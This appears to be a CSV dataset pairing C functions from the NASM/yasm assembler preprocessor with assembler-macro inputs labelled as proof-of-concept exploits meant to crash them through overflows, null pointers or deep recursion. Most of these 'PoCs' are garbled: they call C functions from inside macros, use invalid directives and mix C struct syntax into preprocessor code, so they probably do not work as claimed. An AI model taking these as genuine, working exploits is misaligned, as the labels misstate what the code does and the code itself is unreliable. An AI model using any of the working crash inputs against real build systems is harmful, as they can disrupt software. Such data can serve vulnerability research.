Vulnerable Code,PoC Exploit Code,Vul_Index
"expand_mmac_params(Token * tline) { Token *t, *tt, **tail, *thead; tail = &thead; thead = NULL; while (tline) { if (tline->type == TOK_PREPROC_ID && (((tline->text[1] == '+' || tline->text[1] == '-') && tline->text[2]) || tline->text[1] == '%' || (tline->text[1] >= '0' && tline->text[1] <= '9'))) { char *text = NULL; int type = 0, cc; char tmpbuf[30]; char *second_text = NULL; int n, i; MMacro *mac; t = tline; tline = tline->next; second_text = strchr(t->text, ':'); mac = istk->mstk; while (mac && !mac->name) mac = mac->next_active; if (!mac) error(ERR_NONFATAL, '`%s': not in a macro call', t->text); else { if (second_text) { int end = atoi(second_text+1)-1; int is_fst = 1; int k; n = atoi(t->text + 1)-1; if (end < 0) end += mac->nparam; for (k = n; k <= end; k++) { if (k >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) k = (k + mac->rotate) % mac->nparam; tt = mac->params[k]; } if (tt) { if (!is_fst && mac->paramlen[k]) { *tail = new_Token(NULL, TOK_OTHER, ',', 0); tail = &(*tail)->next; } if (mac->paramlen[k]) is_fst = 0; for (i = 0; i < mac->paramlen[k]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } else { switch (t->text[1]) { case '0': type = TOK_NUMBER; sprintf(tmpbuf, '%ld', mac->nparam); text = nasm_strdup(tmpbuf); break; case '%': type = TOK_ID; sprintf(tmpbuf, '..@%lu.', mac->unique); text = nasm_strcat(tmpbuf, t->text + 2); break; case '-': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; if (inverse_ccs[cc] == -1) { error(ERR_NONFATAL, 'condition code `%s' is not invertible', conditions[cc]); text = NULL; } else text = nasm_strdup(conditions[inverse_ccs [cc]]); } break; case '+': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; text = nasm_strdup(conditions[cc]); } break; default: n = atoi(t->text + 1) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } if (tt) { for (i = 0; i < mac->paramlen[n]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } } if (!text) { delete_Token(t); } else { *tail = t; tail = &t->next; t->type = type; nasm_free(t->text); t->text = text; t->mac = NULL; } continue; } else { t = *tail = tline; tline = tline->next; t->mac = NULL; tail = &t->next; } } *tail = NULL; t = thead; for (; t && (tt = t->next) != NULL; t = t->next) switch (t->type) { case TOK_WHITESPACE: if (tt->type == TOK_WHITESPACE) { t->next = delete_Token(tt); } break; case TOK_ID: if (tt->type == TOK_ID || tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; case TOK_NUMBER: if (tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; } return thead; }","%macro crash_macro 1
    %rep 1000000  ; Large repetition to manipulate rotation and indexing
        %rotate 1
        %+1: %+1
    %endrep
%endmacro

%define %+1 a
crash_macro %+1",vul2_1
,"%macro crash_yasm 0
    %define huge_value 2147483647 ; Large integer to induce overflow
    %assign %$rotate huge_value
    %rep 1
        %xdefine %+ %$rotate
    %endrep
    %rotate huge_value
    %rep 1
        %x 1
    %endrep
%endmacro

crash_yasm",vul2_2
,"%macro crash_macro 0
    %assign %$rotate 1
    %assign %$nparam 1
    %define %$params[0] 12345
    %rep 2
        %rotate 1
        %xdefine %$params[%$rotate] (%$params[%$rotate-1] + 1)
    %endrep
    %error ""Triggering access violation with rotated parameter: %$params[1]""
%endmacro

crash_macro",vul2_3
,"%macro trigger_vulnerability 0
    %define %$rotate 5
    %define %$nparam 1
    %rep 10
        %xdefine %+ %1
    %endrep
%endmacro

%macro setup 0
    %assign %$rotate -1
    %assign %$nparam 0
    trigger_vulnerability
%endmacro

setup",vul2_4
,"%macro crash_yasm 0
    %rep 1
        %1
    %endrep
%endmacro

%define %$param1 1
%define %$param2 2

%assign %$index 3  ; Intentionally out of bounds
crash_yasm %$param%$index",vul2_5
,"%macro crash_yasm 0
    %define mac.nparam 3
    %define mac.rotate 2147483647
    %define mac.params 0x123456

    %assign k 2
    %rep 1
        %assign k (k + mac.rotate) % mac->nparam
        %if k >= mac.nparam
            %error ""Index out of bounds""
        %endif
    %endrep
%endmacro

crash_yasm",vul2_6
,"%macro crash_yasm 0
    %rep 1
        %1: .equ 0
    %endrep
%endmacro

%define idx 999999
crash_yasm %1: %+ idx

%macro setup 0
    %assign i 0
    %rep 5
        %xdefine param%+i i
        %assign i i+1
    %endrep
%endmacro

setup
crash_yasm param999999",vul2_7
,"%macro crash_macro 1
    %rep 1000000
        %+1: %+1
    %endrep
%endmacro

%define %+1 1
crash_macro %+1",vul2_8
"pp_getline(void) { char *line; Token *tline; while (1) { tline = NULL; if (first_line) { poke_predef(predef); poke_predef(stddef); poke_predef(builtindef); first_line = 0; } if (!istk) return NULL; while (istk->expansion && istk->expansion->finishes) { Line *l = istk->expansion; if (!l->finishes->name && l->finishes->in_progress > 1) { Line *ll; l->finishes->in_progress--; for (l = l->finishes->expansion; l; l = l->next) { Token *t, *tt, **tail; ll = nasm_malloc(sizeof(Line)); ll->next = istk->expansion; ll->finishes = NULL; ll->first = NULL; tail = &ll->first; for (t = l->first; t; t = t->next) { if (t->text || t->type == TOK_WHITESPACE) { tt = *tail = new_Token(NULL, t->type, t->text, 0); tail = &tt->next; } } istk->expansion = ll; } } else { if (defining) { if (defining->name) error(ERR_PANIC, 'defining with name in expansion'); else if (istk->mstk->name) error(ERR_FATAL, '`%%rep' without `%%endrep' within expansion of macro `%s'', istk->mstk->name); } MMacro *m = istk->mstk; istk->mstk = m->next_active; if (m->name) { nasm_free(m->params); free_tlist(m->iline); nasm_free(m->paramlen); l->finishes->in_progress = FALSE; } else free_mmacro(m); istk->expansion = l->next; nasm_free(l); list->downlevel(LIST_MACRO); } } while (1) { if (istk->expansion) { char *p; Line *l = istk->expansion; if (istk->mstk) istk->mstk->lineno++; tline = l->first; istk->expansion = l->next; nasm_free(l); p = detoken(tline, FALSE); list->line(LIST_MACRO, p); nasm_free(p); break; } line = read_line(); if (line) { line = prepreproc(line); tline = tokenise(line); nasm_free(line); break; } Include *i = istk; if (i->fp != first_fp) fclose(i->fp); if (i->conds) error(ERR_FATAL, 'expected `%%endif' before end of file'); if (i->next) { nasm_src_set_linnum(i->lineno); nasm_free(nasm_src_set_fname(nasm_strdup(i->fname))); } istk = i->next; list->downlevel(LIST_INCLUDE); nasm_free(i->fname); nasm_free(i); if (!istk) return NULL; if (istk->expansion && istk->expansion->finishes) break; } if (!defining && !(istk->conds && !emitting(istk->conds->state))) tline = expand_mmac_params(tline); if (do_directive(tline) == DIRECTIVE_FOUND) { continue; } else if (defining) { Line *l = nasm_malloc(sizeof(Line)); l->next = defining->expansion; l->first = tline; l->finishes = FALSE; defining->expansion = l; continue; } else if (istk->conds && !emitting(istk->conds->state)) { free_tlist(tline); continue; } else if (istk->mstk && !istk->mstk->in_progress) { free_tlist(tline); continue; } else { tline = expand_smacro(tline); if (!expand_mmacro(tline)) { if (tasm_compatible_mode) tline = tasm_join_tokens(tline); line = detoken(tline, TRUE); free_tlist(tline); break; } else { continue; } } } return line; }","%macro trigger_pp_getline_crash 0
    %define %$tline %1
    %define %$l %2
    %define %$tail %3

    %assign %$l nasm_malloc(sizeof(Line))
    %assign %$tline new_Token(NULL, TOK_WHITESPACE, NULL, 0)
    %assign %$tail %$tline

    ; Create a circular reference in token list
    %$tail.next = %$tline

    ; Force pp_getline to process this corrupted token list
    %$l.first = %$tline
    %$l.next = NULL
    %$l.finishes = FALSE

    ; Simulate the environment where pp_getline is called
    %assign istk %$l
%endmacro

trigger_pp_getline_crash",vul3_1
,"%macro trigger_null_pointer 0
    %rep 1
        %assign %$l NULL
        %define istk->expansion %$l
    %endrep
%endmacro

trigger_null_pointer",vul3_2
,"%macro crash_pp_getline 0
    ; Triggering invalid memory access in pp_getline by manipulating token expansion
    %rep 1
        %define %$malformed_token NULL
        %assign %$malformed_expansion 1
        %if %$malformed_expansion
            %error ""Simulated error to trigger unexpected token expansion path""
        %endif
    %endrep
%endmacro

; Execute the macro to simulate the condition in pp_getline
crash_pp_getline",vul3_3
,"%macro trigger_null_pointer 0
    ; Simulate the condition where istk->expansion is not NULL but l->first is NULL
    struc Line
        .next resq 1
        .finishes resq 1
        .first resq 1  ; Deliberately set to NULL (0)
    endstruc

    ; Allocate memory for a Line structure and set it as the current expansion
    %define l nasm_malloc(sizeof(Line))
    mov [l.first], 0  ; Explicitly set first to NULL to simulate the condition

    ; Mock the istk structure to point to our crafted Line structure
    %define istk nasm_malloc(sizeof(Include))
    mov [istk.expansion], l

    ; Trigger the pp_getline function which will attempt to access l->first
    call pp_getline
%endmacro

trigger_null_pointer",vul3_4
,"%macro crash_yasm 0
    struc bad_struct
        .field resb 1
    endstruc

    %define mac (bad_struct [0])

    %assign mac.name 0
    %rep 1
        %rotate 1
        %xdefine %+ mac %+ .name %+ 1 %+ 2 %+ 3 %+ 4 %+ 5 %+ 6 %+ 7 %+ 8 %+ 9 %+ 0
    %endrep
%endmacro

crash_yasm",vul4_2
,"%macro trigger_crash 0
    %define %+ %1
%endmacro

%macro setup_invalid_macro 0
    %assign %$mac_name NULL
    %define %+ %$mac_name
%endmacro

setup_invalid_macro
trigger_crash",vul4_3
,"%macro crash_yasm 0
    %define %$mac NULL
    %assign %$mac.name NULL
    %rep 1
        %xdefine %+ %$mac
    %endrep
%endmacro

crash_yasm",vul4_4
,"%macro exploit_macro 0
    %define %$mac NULL
    %assign %$mac.next_active NULL
    %assign %$mac.name NULL
    %assign %$mac.nparam 0
    %assign %$mac.rotate 0
    %assign %$mac.params NULL
    %assign %$mac.paramlen NULL

    %rep 1
        %$mac.next_active: dd 0
        %$mac.name: dd 0
        %$mac.nparam: dd 0
        %$mac.rotate: dd 0
        %$mac.params: dd 0
        %$mac.paramlen: dd 0
    %endrep
%endmacro

exploit_macro",vul4_5
,"%macro crash_macro 0
    %define mac->nparam 3
    %define mac->rotate 0x7FFFFFFF
    %define mac->params {1, 2, 3}
    %rep 1
        %+1: ; Force rotation calculation overflow
    %endrep
%endmacro

crash_macro",vul4_6
"int find_cc(Token * t) { Token *tt; int i, j, k, m; skip_white_(t); if (t->type != TOK_ID) return -1; tt = t->next; skip_white_(tt); if (tt && (tt->type != TOK_OTHER || strcmp(tt->text, \"",\""))) return -1; i = -1; j = elements(conditions); while (j - i > 1) { k = (j + i) / 2; m = nasm_stricmp(t->text, conditions[k]); if (m == 0) { i = k; j = -2; break; } else if (m < 0) { j = k; } else i = k; } if (j != -2) return -1; return i;","%macro trigger_find_cc 0
    %define TOK_ID 1
    %define TOK_OTHER 2
    %define TOK_PREPROC_ID 3  ; Incorrect token type that should be handled as TOK_ID

    %struc token
        .type resb 1
        .next resq 1
        .text resb 64
    %endstruc

    %assign %$token token
    %assign %$next_token token + token.size

    db TOK_PREPROC_ID
    dq %$next_token
    db 'condition', 0

    %struc token
        .type resb 1
        .next resq 1
        .text resb 64
    %endstruc
    db TOK_OTHER
    dq 0
    db ',', 0
%endmacro

trigger_find_cc",vul5_1
,"%macro crash_find_cc 0
    struc Token
        .type resb 1
        .next resq 1
        .text resb 8
    endstruc

    section .bss
    token_instance resb Token_size

    section .text
    %define t token_instance
    mov byte [t+Token.type], TOK_OTHER
    mov qword [t+Token.next], 0

    extern find_cc
    call find_cc t
%endmacro

crash_find_cc",vul5_2
,"%macro trigger_find_cc 0
    struc Token
        .type resb 1
        .next resq 1
        .text resb 8
    endstruc

    section .data
    token_instance Token 0x00, 0, ""fake""

    section .text
    %define t token_instance
    %assign t.type TOK_OTHER
    %assign t.next 0

    extern find_cc
    call find_cc t
%endmacro

trigger_find_cc",vul5_3
,"%macro trigger_find_cc 0
    %struc Token
        type resb 1
        next resb 8
        text resb 16
    %endstruc

    %define TOK_ID 1
    %assign %$t Token

    db 0
    dq %$t+17
    db ""condition1"", 0

    %assign %$tt Token
    db 1
    dq 0
    db "","", 0

    %rep 1
        db 0
    %endrep
%endmacro

trigger_find_cc",vul5_4
,"%macro crash_find_cc 0
    struc Token
        .type resb 1
        .next resb 8
        .text resb 8
    endstruc

    section .data
    token Token 0x00, 0, 0

    section .text
    %define t token
    %assign t.type TOK_OTHER
    %assign t.next 0
    %assign t.text 0

    call find_cc
%endmacro

crash_find_cc",vul5_5
,"%macro crash_find_cc 0
    struc Token
        .type resb 1
        .next resq 1
        .text resb 8
    endstruc

    section .data
    token_instance Token 0x00, 0, ""dummy""

    section .text
    %define t token_instance
    %assign t.type TOK_OTHER

    mov rdi, t
    call find_cc
%endmacro

crash_find_cc",vul5_6
,"%macro trigger_find_cc_crash 0
    %struc Token
        .type resb 1
        .next resb 8
        .text resb 8
    %endstruc

    %define TOK_ID 1
    %define TOK_OTHER 2

    %assign %$token Token
    %assign %$token.type TOK_ID
    %assign %$token.next 0
    %assign %$token.text conditions

    find_cc %$token
%endmacro

trigger_find_cc_crash",vul5_7
"Token *new_Token(Token *next, int type, const char *text, size_t txtlen) { Token *t; int i; if (freeTokens == NULL) { freeTokens = (Token *)new_Block(TOKEN_BLOCKSIZE * sizeof(Token)); for (i = 0; i < TOKEN_BLOCKSIZE - 1; i++) freeTokens[i].next = &freeTokens[i + 1]; freeTokens[i].next = NULL; } t = freeTokens; freeTokens = t->next; t->next = next; t->mac = NULL; t->type = type; if (type == TOK_WHITESPACE || text == NULL) { t->text = NULL; } else { if (txtlen == 0) txtlen = strlen(text); t->text = nasm_malloc(1 + txtlen); strncpy(t->text, text, txtlen); t->text[txtlen] = '\\0'; } return t;","%macro trigger_token_overflow 0
    %define huge_length 0xFFFFFFFF
    %strcat long_string ""A"" * huge_length

    %assign %$token_type TOK_IDENTIFIER
    %assign %$next_token NULL

    %rep 1
        new_Token %$next_token, %$token_type, long_string, huge_length
    %endrep
%endmacro

trigger_token_overflow",vul6_1
,"%macro trigger_token_overflow 0
    %assign %$txtlen 0xFFFFFFFF
    %define %$text ""A""

    %struc Token
        .next resq 1
        .mac resq 1
        .type resd 1
        .text resq 1
    %endstruc

    %define %$token Token

    %rep 1
        new_Token NULL, 1, %$text, %$txtlen
    %endrep
%endmacro

trigger_token_overflow",vul6_2
,"%macro trigger_token_overflow 0
    %define huge_length 0xffffffffffffffff
    %struc bad_token
        .next resq 1
        .type resd 1
        .text resb 1
    %endstruc

    section .data
    bad_text db 'A', 0
    bad_token_instance bad_token

    section .text
    mov rdi, bad_token_instance.next
    mov rsi, 1
    mov rdx, bad_text
    mov rcx, huge_length
    call new_Token
%endmacro

trigger_token_overflow",vul6_3
,"%macro trigger_new_token_overflow 0
    %struc Token
        .next resb 8
        .mac resb 8
        .type resd 1
        .text resb 8
    %endstruc

    %define huge_length 0xFFFFFFFFFFFFFFFF
    %assign %$text_ptr nasm_malloc(1)
    %define %$text ""A""

    %define %$token_ptr new_Token(NULL, 1, %$text_ptr, huge_length)
%endmacro

trigger_new_token_overflow",vul6_4
,"%macro trigger_token_overflow 0
    %define huge_length 0xffffffffffffffff
    %struc bad_token
        .next resq 1
        .type resd 1
        .text resb 1
    %endstruc

    section .data
    bad_text db 'A', 0

    %define %$simulate_new_token
        mov rdi, NULL
        mov rsi, TOK_PREPROC_ID
        mov rdx, bad_text
        mov rcx, huge_length
        call new_Token
    %enddefine

    %$simulate_new_token
%endmacro

trigger_token_overflow",vul6_5
,"%macro crash_new_token 0
    %struc Token
        .next resq 1
        .mac resq 1
        .type resd 1
        .text resq 1
    %endstruc

    %define TOKEN_BLOCKSIZE 10
    %define TOK_WHITESPACE 1

    section .data
    token_instance Token

    %assign %$txtlen 0xFFFFFFFFFFFFFFFF
    %define %$text ""A""

    %rep 1
        new_Token token_instance, TOK_WHITESPACE, %$text, %$txtlen
    %endrep
%endmacro

crash_new_token",vul6_6
,"%macro trigger_overflow 0
    %define huge_length 0xFFFFFFFF
    %struc bad_input
        .next resb 1
        .type resb 1
        .text resb 1
        .txtlen resd 1
    %endstruc

    %assign %$input bad_input
    [%$input.txtlen]: dd huge_length

    %define %$text ""A""
    %rep huge_length
        %$text: db ""A""
    %endrep

    new_Token NULL, 1, %$text, [%$input.txtlen]
%endmacro

trigger_overflow",vul6_7
,"%macro trigger_integer_overflow 0
    struc Token
        .next resq 1
        .mac resq 1
        .type resd 1
        .text resq 1
    endstruc

    section .data
    large_txtlen equ 0xFFFFFFFFFFFFFFFF

    %assign %$txt ""A""
    %rep large_txtlen
        %assign %$txt %+ ""A""
    %endrep

    %define create_token new_Token(NULL, 1, %$txt, large_txtlen)

    %rep 1
        create_token
    %endrep
%endmacro

trigger_integer_overflow",vul6_8
,"%macro trigger_token_overflow 0
    struc Token
        .next resq 1
        .mac resq 1
        .type resd 1
        .text resq 1
    endstruc

    section .data
    large_text db 0x00

    section .text
    %define SIZE_MAX 0xFFFFFFFFFFFFFFFF
    %assign txtlen SIZE_MAX
    %assign type 1

    %rep 1
        extern new_Token
        mov rdi, 0
        mov rsi, type
        mov rdx, large_text
        mov rcx, txtlen
        call new_Token
    %endrep
%endmacro

trigger_token_overflow",vul6_9
"int expr_traverse_nodes_post(yasm_expr *e, void *d, int (*func) (yasm_expr *e, void *d)) { int i; if (!e) return 0; for (i = 0; i < e->numterms; i++) { if (e->terms[i].type == YASM_EXPR_EXPR && expr_traverse_nodes_post(e->terms[i].data.expn, d, func)) return 1; } return func(e, d);","%macro create_deep_expr 1
    %if %1 > 0
        struc expr
            .type resb 1
            .data resb 8
        alignb 8
        expr:
            db YASM_EXPR_EXPR
            dq expr-%1
        %assign %1 %1-1
        %rep 1
            create_deep_expr %1
        %endrep
    %endif
%endmacro

%macro trigger_overflow 0
    create_deep_expr 1000
%endmacro

trigger_overflow",vul7_1
,"%macro create_expr 0
    %assign i 0
    %rep 10000
        %if i % 2
            %define expr (expr + i)
        %else
            %define expr (expr - i)
        %endif
        %assign i i+1
    %endrep
    expr
%endmacro

%macro trigger_overflow 0
    create_expr
%endmacro

trigger_overflow",vul7_2
,"%macro create_deep_expr 1
    %if %1 > 0
        struc expr
            .type resb 1
            .data resb 8
        endstruc

        %assign %%next %1-1
        create_deep_expr %%next

        %define expr_data expr.data
        %define expr_type YASM_EXPR_EXPR
        %define expr_terms expr_type, expr_data
    %endif
%endmacro

%macro trigger_overflow 0
    create_deep_expr 10000
    expr_traverse_nodes_post expr, NULL, NULL
%endmacro

trigger_overflow",vul7_3
,"%macro create_deep_expr 1
    %if %1 > 0
        %define expr_%1 expr_%1-1
        create_deep_expr %1-1
    %else
        %define expr_0 0
    %endif
%endmacro

%macro exploit_expr_traverse_nodes_post 0
    create_deep_expr 1000
    %assign i 0
    %rep 1000
        db expr_%i
        %assign i i+1
    %endrep
%endmacro

exploit_expr_traverse_nodes_post",vul7_4
,"%macro generate_deep_expr 1
    %if %1 > 0
        generate_deep_expr %1-1
    %else
        db ""Terminal Expression""
    %endif
%endmacro

%macro fake_expr_traverse_nodes_post 0
    %assign depth 1000
    generate_deep_expr depth
%endmacro

fake_expr_traverse_nodes_post",vul7_5
,"%macro create_deep_expr 1
    %if %1 > 0
        struc expr
            .type resb 1
            .data resb 8
        endstruc

        %assign %%next_level %1-1
        create_deep_expr %%next_level

        %define %$expr_instance expr
        %define %$expr_type YASM_EXPR_EXPR
        %define %$data_offset expr.data

        %$expr_instance.type db %$expr_type
        %$expr_instance.data dq %$data_offset
    %endif
%endmacro

%macro trigger_overflow 0
    create_deep_expr 10000
%endmacro

trigger_overflow",vul7_6
,"%macro create_deep_expr 1
    %if %1 > 0
        struc expr
            .type resb 1
            .data resb 8
        alignb 8
        endstruc

        %assign next_level %1 - 1
        create_deep_expr next_level

        %define expr_data expr
        %define expr_type YASM_EXPR_EXPR

        expr_traverse_nodes_post expr_data, NULL, NULL
    %endif
%endmacro

create_deep_expr 1000",vul7_7
"yasm_ex yasm_section_bcs_first(yasm_section *sect) { return STAILQ_FIRST(&sect->bcs); } yasm_bytecode * yasm_section_bcs_last(yasm_section *sect) { return STAILQ_LAST(&sect->bcs, yasm_bytecode, link); }","%macro crash_yasm_section_bcs_first 0
    struc fake_yasm_section
        .bcs resb 1
    endstruc

    section .data
    fake_sect: istruc fake_yasm_section
        at fake_yasm_section.bcs, db 0x00
    iend

    section .text
    %define sect fake_sect
    %assign %$result yasm_section_bcs_first(sect)
%endmacro

crash_yasm_section_bcs_first",vul8_1
,"%macro trigger_section_bcs_first 0
    struc yasm_section
        .bcs resb 1
    endstruc

    section .data
    corrupt_section db 0x00

    %define sect corrupt_section

    %rep 1
        db yasm_section_bcs_first(sect)
    %endrep
%endmacro

trigger_section_bcs_first",vul8_2
,"%macro fake_yasm_section 0
    db 0x0  ; simulate empty or corrupted 'bcs' field in yasm_section structure
%endmacro

section .text
    fake_yasm_section

    mov rdi, offset fake_yasm_section
    call yasm_section_bcs_first",vul8_3
